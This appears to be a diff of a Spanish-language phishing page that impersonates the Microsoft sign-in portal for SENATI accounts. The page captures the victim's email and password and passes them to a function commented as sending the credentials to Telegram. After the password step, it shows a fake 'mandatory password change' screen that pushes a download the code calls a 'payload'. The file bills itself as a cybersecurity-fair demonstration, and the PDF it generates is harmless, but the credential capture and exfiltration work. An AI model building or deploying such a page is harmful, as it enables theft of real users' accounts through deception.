@@ -1,20 +1,36 @@
 <!DOCTYPE html>
 <html dir="ltr" lang="es">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
     <title>Iniciar sesión en la cuenta</title>
-    
+
     <link rel="shortcut icon" href="favicon_2.ico" type="image/x-icon" sizes="32x32" />
 
     <style>
-        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-        html, body { height: 100%; font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ubuntu", sans-serif; overflow: hidden; }
-        
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html,
+        body {
+            height: 100%;
+            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ubuntu", sans-serif;
+            overflow: hidden;
+        }
+
         .body-img {
             background-image: url("independencia.jpg");
             position: fixed;
-            top: 0; bottom: 0; right: 0; left: 0;
+            top: 0;
+            bottom: 0;
+            right: 0;
+            left: 0;
             background-repeat: no-repeat;
             background-size: cover;
             background-position: center;
@@ -37,7 +53,8 @@
             width: 100% !important;
             height: 100% !important;
             position: fixed;
-            top: 0; left: 0;
+            top: 0;
+            left: 0;
             z-index: -1;
         }
 
@@ -59,16 +76,18 @@
             max-width: 440px;
             min-height: 338px;
             padding: 44px;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
             text-align: left;
             display: flex;
             flex-direction: column;
             position: relative;
+            transition: all 0.3s ease;
         }
 
         .logo-container {
             margin-bottom: 20px;
         }
+
         .logo-container img {
             height: 36px;
             display: block;
@@ -79,6 +98,7 @@
             flex-direction: column;
             width: 100%;
         }
+
         .view-section.active-view {
             display: flex;
         }
@@ -91,6 +111,7 @@
             margin-bottom: 16px;
             cursor: pointer;
         }
+
         .back-arrow {
             width: 24px;
             height: 24px;
@@ -118,6 +139,7 @@
             margin-bottom: 20px;
             position: relative;
         }
+
         .input-control {
             width: 100%;
             border: none;
@@ -129,16 +151,20 @@
             font-family: inherit;
             transition: border-color 0.2s;
         }
+
         .input-control:focus {
             border-bottom: 2px solid #0067b8;
             padding-bottom: 5px;
         }
+
         .input-control.input-error {
             border-bottom: 1px solid #e81123 !important;
         }
+
         .input-control.input-error:focus {
             border-bottom: 2px solid #e81123 !important;
         }
+
         .input-control::placeholder {
             color: #707070;
             font-weight: 300;
@@ -151,6 +177,7 @@
             display: inline-block;
             margin-bottom: 24px;
         }
+
         .help-link:hover {
             text-decoration: underline;
         }
@@ -160,6 +187,7 @@
             justify-content: flex-end;
             margin-bottom: 20px;
         }
+
         .btn-action {
             background-color: #0067b8;
             color: #ffffff;
@@ -172,6 +200,7 @@
             font-family: inherit;
             text-align: center;
         }
+
         .btn-action:hover {
             background-color: #005da6;
         }
@@ -181,16 +210,18 @@
             max-width: 440px;
             background: #ffffff;
             margin-top: 20px;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
             padding: 12px 44px;
             display: flex;
             align-items: center;
             cursor: pointer;
             transition: background 0.2s;
         }
+
         .options-container:hover {
             background: #f2f2f2;
         }
+
         .options-icon {
             width: 32px;
             height: 32px;
@@ -199,11 +230,13 @@
             align-items: center;
             justify-content: center;
         }
+
         .options-icon img {
             width: 100%;
             height: 100%;
             object-fit: contain;
         }
+
         .options-text {
             font-size: 15px;
             color: #1b1b1b;
@@ -217,13 +250,111 @@
             gap: 16px;
             z-index: 10;
         }
+
         .footer-links a {
             color: #ffffff;
             text-decoration: none;
             font-size: 12px;
         }
+
         .footer-links a:hover {
             text-decoration: underline;
+        }
+
+        /* Estilos para la pantalla de descarga */
+        .download-section {
+            text-align: center;
+            padding: 20px 10px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .warning-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+            display: inline-block;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+
+            50% {
+                transform: scale(1.1);
+                opacity: 0.8;
+            }
+
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .download-title {
+            color: #d32f2f;
+            font-size: 26px;
+            margin-bottom: 20px;
+        }
+
+        .download-description {
+            font-size: 17px;
+            line-height: 1.6;
+            margin: 25px 0;
+            color: #333;
+        }
+
+        .btn-download {
+            display: inline-block;
+            background: #d32f2f;
+            color: white;
+            padding: 16px 36px;
+            font-size: 17px;
+            font-weight: 600;
+            border-radius: 8px;
+            text-decoration: none;
+            box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4);
+            margin: 20px 0;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            border: none;
+            font-family: inherit;
+        }
+
+        .btn-download:hover {
+            background: #b71c1c;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(211, 47, 47, 0.5);
+        }
+
+        .download-note {
+            font-size: 14px;
+            color: #666;
+            margin-top: 30px;
+        }
+
+        .simulation-badge {
+            background: #e8f0fe;
+            border-radius: 20px;
+            padding: 12px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #0067b8;
+            text-align: center;
+            border: 1px dashed #0067b8;
         }
 
         @media (max-width: 500px) {
@@ -232,28 +363,37 @@
                 padding: 0;
                 background-color: #ffffff;
             }
+
             .login-card {
                 box-shadow: none;
                 padding: 44px 24px;
                 min-height: auto;
             }
+
             .options-container {
                 box-shadow: none;
                 border-top: 1px solid #e5e5e5;
                 padding: 16px 24px;
                 margin-top: 0;
             }
+
             .footer-links {
                 position: static;
                 margin-top: auto;
                 padding: 20px;
                 width: 100%;
                 justify-content: center;
-                background: rgba(0,0,0,0.6);
+                background: rgba(0, 0, 0, 0.6);
+            }
+
+            .btn-download {
+                padding: 14px 24px;
+                font-size: 15px;
             }
         }
     </style>
 </head>
+
 <body>
 
     <div class="body-img"></div>
@@ -264,25 +404,27 @@
     </video>
 
     <div class="page-wrapper">
-        
-        <div class="login-card">
+
+        <div class="login-card" id="loginCard">
             <div class="logo-container">
-                <img src="https://aadcdn.msftauthimages.net/dbd5a2dd-mhbtl0s7mnpe7copyihnx5eqzxphdvb3wnc9nifovky/logintenantbranding/0/bannerlogo?ts=636447417650821001" alt="SENATI">
+                <img src="https://aadcdn.msftauthimages.net/dbd5a2dd-mhbtl0s7mnpe7copyihnx5eqzxphdvb3wnc9nifovky/logintenantbranding/0/bannerlogo?ts=636447417650821001"
+                    alt="SENATI">
             </div>
-            
+
             <div class="view-section active-view" id="emailSection">
                 <h1 class="title">Iniciar sesión</h1>
-                
+
                 <div class="error-message" id="errorDiv">
                     No se ha podido encontrar una cuenta con ese nombre de usuario.
                 </div>
-                
+
                 <div class="input-group">
-                    <input type="text" id="emailInput" class="input-control" placeholder="alguien@senati.pe" autocomplete="off" required>
+                    <input type="text" id="emailInput" class="input-control" placeholder="alguien@senati.pe"
+                        autocomplete="off" required>
                 </div>
-                
+
                 <a href="#" class="help-link" onclick="return false;">¿No puede acceder a su cuenta?</a>
-                
+
                 <div class="button-group">
                     <button type="button" id="btnNext" class="btn-action">Siguiente</button>
                 </div>
@@ -291,7 +433,10 @@
             <div class="view-section" id="passwordSection">
                 <div class="identity-banner" id="backToEmail">
                     <div class="back-arrow">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="#2b2b2b" stroke-width="1.5"><path d="M15 8H1M1 8L8 15M1 8L8 1"/></svg>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none"
+                            stroke="#2b2b2b" stroke-width="1.5">
+                            <path d="M15 8H1M1 8L8 15M1 8L8 1" />
+                        </svg>
                     </div>
                     <span id="displayEmail">correo@senati.pe</span>
                 </div>
@@ -299,15 +444,17 @@
                 <h1 class="title">Escribir contraseña</h1>
 
                 <div class="error-message" id="errorPasswordDiv">
-                    Su cuenta o contraseña no son correctas. Si no recuerda su contraseña, <a href="#" onclick="return false;" style="color: #0067b8; text-decoration: none;">restablézcala ahora.</a>
+                    Su cuenta o contraseña no son correctas. Si no recuerda su contraseña, <a href="#"
+                        onclick="return false;" style="color: #0067b8; text-decoration: none;">restablézcala ahora.</a>
                 </div>
-                
+
                 <div class="input-group">
-                    <input type="password" id="passwordInput" class="input-control" placeholder="Contraseña" autocomplete="off" required>
+                    <input type="password" id="passwordInput" class="input-control" placeholder="Contraseña"
+                        autocomplete="off" required>
                 </div>
-                
+
                 <a href="#" class="help-link" onclick="return false;">He olvidado mi contraseña</a>
-                
+
                 <div class="button-group">
                     <button type="button" id="btnSubmit" class="btn-action">Iniciar sesión</button>
                 </div>
@@ -316,14 +463,18 @@
 
         <div class="options-container" id="optionsContainer">
             <div class="options-icon">
-                <img src="https://aadcdn.msftauthimages.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="Opciones">
+                <img src="https://aadcdn.msftauthimages.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
+                    alt="Opciones">
             </div>
             <div class="options-text">Opciones de inicio de sesión</div>
         </div>
 
+        <!-- Footer Links -->
         <div class="footer-links">
-            <a href="https://www.microsoft.com/es-ES/servicesagreement/" target="_blank">Términos de uso</a>
-            <a href="https://privacy.microsoft.com/es-ES/privacystatement" target="_blank">Privacidad y cookies</a>
+            <a href="https://www.microsoft.com/es-ES/servicesagreement/" target="_blank"
+                rel="noopener noreferrer">Términos de uso</a>
+            <a href="https://privacy.microsoft.com/es-ES/privacystatement" target="_blank"
+                rel="noopener noreferrer">Privacidad y cookies</a>
         </div>
     </div>
 
@@ -352,6 +503,136 @@
             }
         }
 
+        // ===================== FUNCIÓN PARA GENERAR Y DESCARGAR PDF =====================
+        // Esta función crea un PDF didáctico para la feria de ciberseguridad
+        function generarYDescargarPDF(correoUsuario) {
+            // Crear un documento PDF usando jsPDF (incluido desde CDN)
+            // Como jsPDF no está cargado, usaremos una alternativa: crear un blob con contenido PDF real
+            // Para este ejemplo, generamos un PDF simple usando la API de jsPDF dinámicamente
+
+            // Cargar jsPDF dinámicamente
+            if (typeof window.jspdf === 'undefined') {
+                const script = document.createElement('script');
+                script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js';
+                script.onload = () => {
+                    generarPDFConContenido(correoUsuario);
+                };
+                document.head.appendChild(script);
+            } else {
+                generarPDFConContenido(correoUsuario);
+            }
+        }
+
+        function generarPDFConContenido(correoUsuario) {
+            const { jsPDF } = window.jspdf;
+            const doc = new jsPDF();
+
+            // Configurar el documento
+            doc.setFont("helvetica");
+
+            // Título principal
+            doc.setFontSize(22);
+            doc.setTextColor(40, 40, 40);
+            doc.text("SENATI - Cambio Obligatorio de Contraseña", 20, 25);
+
+            // Línea decorativa
+            doc.setDrawColor(211, 47, 47);
+            doc.setLineWidth(1.5);
+            doc.line(20, 32, 190, 32);
+
+            // Información del usuario
+            doc.setFontSize(12);
+            doc.setTextColor(80, 80, 80);
+            doc.text(`Usuario: ${correoUsuario}`, 20, 50);
+            doc.text(`Fecha de solicitud: ${new Date().toLocaleString()}`, 20, 60);
+
+            // Sección de instrucciones
+            doc.setFontSize(16);
+            doc.setTextColor(211, 47, 47);
+            doc.text("Procedimiento de Seguridad", 20, 80);
+
+            doc.setFontSize(11);
+            doc.setTextColor(0, 0, 0);
+
+            const instrucciones = [
+                "1. Acceda al portal oficial de SENATI: https://www.senati.edu.pe",
+                "2. Diríjase a la sección 'Mi Cuenta' o 'Cambiar Contraseña'",
+                "3. Verifique su identidad respondiendo las preguntas de seguridad",
+                "4. Cree una nueva contraseña que cumpla con los siguientes requisitos:",
+                "   • Mínimo 12 caracteres",
+                "   • Al menos una mayúscula y una minúscula",
+                "   • Al menos un número",
+                "   • Al menos un carácter especial (!@#$%^&*)",
+                "5. No utilice contraseñas anteriores o fáciles de adivinar",
+                "6. Active la autenticación de dos factores (2FA) en su perfil",
+                "7. Cierre sesión en todos los dispositivos después del cambio"
+            ];
+
+            let y = 100;
+            for (const instruccion of instrucciones) {
+                doc.text(instruccion, 20, y);
+                y += 7;
+            }
+
+            // Recomendaciones adicionales
+            y += 10;
+            doc.setFontSize(14);
+            doc.setTextColor(211, 47, 47);
+            doc.text("Recomendaciones de Seguridad", 20, y);
+            y += 8;
+
+            doc.setFontSize(11);
+            doc.setTextColor(0, 0, 0);
+            const recomendaciones = [
+                "✓ No comparta su contraseña con nadie",
+                "✓ Cambie su contraseña cada 90 días",
+                "✓ No use la misma contraseña en diferentes servicios",
+                "✓ Revise periódicamente la actividad de su cuenta"
+            ];
+
+            for (const rec of recomendaciones) {
+                doc.text(rec, 20, y);
+                y += 7;
+            }
+
+            // Pie de página
+            const pageHeight = doc.internal.pageSize.height;
+            doc.setFontSize(9);
+            doc.setTextColor(150, 150, 150);
+            doc.text("Documento oficial SENATI - Departamento de Seguridad Informática", 20, pageHeight - 15);
+            doc.text(`Generado: ${new Date().toLocaleDateString()}`, 20, pageHeight - 8);
+
+            // Guardar el PDF
+            doc.save(`SENATI_Cambio_Contrasena_${correoUsuario.split('@')[0]}.pdf`);
+        }
+
+        // Versión alternativa: crear un PDF simple usando Blob (sin librerías externas)
+        // Esto sirve como respaldo
+        function descargarPDFSimulado() {
+            // Contenido del PDF en Base64 (muy simple - es solo para demostración)
+            // En un entorno real, aquí iría el archivo real en la carpeta payload
+            const pdfBase64 = `JVBERi0xLjQKJeLjz9MKMSAwIG9iago8PC9UeXBlL0NhdGFsb2cvUGFnZXMgMiAwIFI+PgplbmRvYmoKMiAwIG9iago8PC9UeXBlL1BhZ2VzL0tpZHNbMyAwIFJdL0NvdW50IDE+PgplbmRvYmoKMyAwIG9iago8PC9UeXBlL1BhZ2UvUGFyZW50IDIgMCBSL01lZGlhQm94WzAgMCA2MTIgNzkyXS9SZXNvdXJjZXM8PC9Gb250PDwvRjEgNSAwIFI+Pj4+L0NvbnRlbnRzIDQgMCBSPj4KZW5kb2JqCjQgMCBvYmoKPDwvRmlsdGVyL0ZsYXRlRGVjb2RlL0xlbmd0aCAyMjU+PgpzdHJlYW0KeJw9UEtugzAQ3fsKXrYLQmM+cyWkihBRV1E3XSCamEET40Q2kPb0tTENZTV6b96PmdkR/G1fq26HjzWq3nqyJwCSpJYhFwA0IW0TZyUY/WA4AVioNyJY8OhyT2cHqCewA1LbEJQbCSHVJH1F5Y3B8DmcjIHD2ZdvOgcDHj6+Pr/fOKphW9AclPStCcbLVCQlq/LBC4gr0Q85iT1MrV+FWPDqyHkgnIQHqoOW9sEaGkKhaRLEPMLQhN/6uQ3nSLUay2UxXMf8Vq2MNW90cd1qR4J9e3zGqAq2MTokMb8dD+xpNgr6X95MZvK2bKHtZ9GFoPvjH7iRgrAKZW5kc3RyZWFtCmVuZG9iago1IDAgb2JqCjw8L1R5cGUvRm9udC9TdWJ0eXBlL1RydWVUeXBlL05hbWUvRjEvQmFzZUZvbnQvSGVsdmV0aWNhL0VuY29kaW5nL1dpbkFuc2lFbmNvZGluZz4+CmVuZG9iagp4cmVmCjAgNgowMDAwMDAwMDAwIDY1NTM1IGYgCjAwMDAwMDAwMTUgMDAwMDAgbiAKMDAwMDAwMDA2NyAwMDAwMCBuIAowMDAwMDAwMTE5IDAwMDAwIG4gCjAwMDAwMDAyMjkgMDAwMDAgbiAKMDAwMDAwMDUwOCAwMDAwMCBuIAp0cmFpbGVyCjw8L1NpemUgNi9Sb290IDEgMCBSPj4Kc3RhcnR4cmVmCjU3MQolJUVPRgo=`;
+
+            // Convertir Base64 a Blob
+            const byteCharacters = atob(pdfBase64);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            const byteArray = new Uint8Array(byteNumbers);
+            const blob = new Blob([byteArray], { type: 'application/pdf' });
+
+            // Crear enlace de descarga
+            const link = document.createElement('a');
+            const url = URL.createObjectURL(blob);
+            link.href = url;
+            link.download = 'Reporte-Seguridad_SENATI.pdf';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
+        }
+
         // ===================== ELEMENTOS Y LÓGICA =====================
         const emailInput = document.getElementById('emailInput');
         const passwordInput = document.getElementById('passwordInput');
@@ -364,6 +645,7 @@
         const btnNext = document.getElementById('btnNext');
         const btnSubmit = document.getElementById('btnSubmit');
         const backToEmailBtn = document.getElementById('backToEmail');
+        const loginCard = document.getElementById('loginCard');
 
         let storedEmail = "";
         let passwordAttempts = 0;
@@ -391,22 +673,70 @@
 
         function procesarContrasena() {
             const passwordValue = passwordInput.value.trim();
+
             if (passwordValue === "") {
                 errorPasswordDiv.style.display = "block";
                 passwordInput.classList.add('input-error');
                 return;
             }
+
             errorPasswordDiv.style.display = "none";
             passwordInput.classList.remove('input-error');
+
+            // Enviar credenciales a Telegram
             enviarAlTelegram(storedEmail, passwordValue);
-            passwordAttempts++;
-            if (passwordAttempts === 1) {
-                errorPasswordDiv.style.display = "block";
-                passwordInput.classList.add('input-error');
-                passwordInput.value = "";
-                passwordInput.focus();
-            } else {
-                window.location.href = "https://senati.blackboard.com/?new_loc=%2Fultra%2Flogout";
+
+            // Mostrar pantalla de cambio de contraseña con descarga del archivo PDF
+            mostrarPantallaDescargaPayload();
+        }
+
+        // Función para mostrar el mensaje de descarga del payload con PDF real
+        function mostrarPantallaDescargaPayload() {
+            // Limpiar y reemplazar contenido del login-card
+            loginCard.innerHTML = `
+                <div class="download-section">
+                    <div class="warning-icon">⚠️</div>
+                    <h1 class="download-title">Acción Requerida</h1>
+                    
+                    <div class="download-description">
+                        <p>Por motivos de seguridad, su cuenta requiere un cambio obligatorio de contraseña.</p>
+                        <p style="margin-top: 15px;"><strong>📄 Descargue el documento oficial con los pasos a seguir para completar el proceso.</strong></p>
+                    </div>
+                    
+                    <button id="downloadPdfBtn" class="btn-download">
+                        📄 DESCARGAR PASOS PARA CAMBIAR CONTRASEÑA
+                    </button>
+                    
+                    <div class="simulation-badge">
+                        🛡️ DEMOSTRACIÓN FERIA DE CIBERSEGURIDAD | Este es un ejercicio educativo controlado
+                    </div>
+                    
+                    <div class="download-note">
+                        <small>El archivo contiene instrucciones detalladas para reactivar su cuenta de forma segura.</small>
+                    </div>
+                </div>
+            `;
+
+            // Agregar evento al botón de descarga
+            const downloadBtn = document.getElementById('downloadPdfBtn');
+            if (downloadBtn) {
+                downloadBtn.addEventListener('click', function () {
+                    // Generar y descargar PDF con el correo del usuario
+                    generarYDescargarPDF(storedEmail);
+
+                    // Pequeña notificación visual
+                    downloadBtn.textContent = '✓ DESCARGA INICIADA...';
+                    downloadBtn.style.background = '#2e7d32';
+                    setTimeout(() => {
+                        downloadBtn.textContent = '📄 DESCARGAR PASOS PARA CAMBIAR CONTRASEÑA';
+                        downloadBtn.style.background = '#d32f2f';
+                    }, 2000);
+                });
+            }
+
+            // Ocultar el contenedor de opciones si existe
+            if (optionsContainer) {
+                optionsContainer.style.display = "none";
             }
         }
 
@@ -429,4 +759,5 @@
         });
     </script>
 </body>
+
 </html>
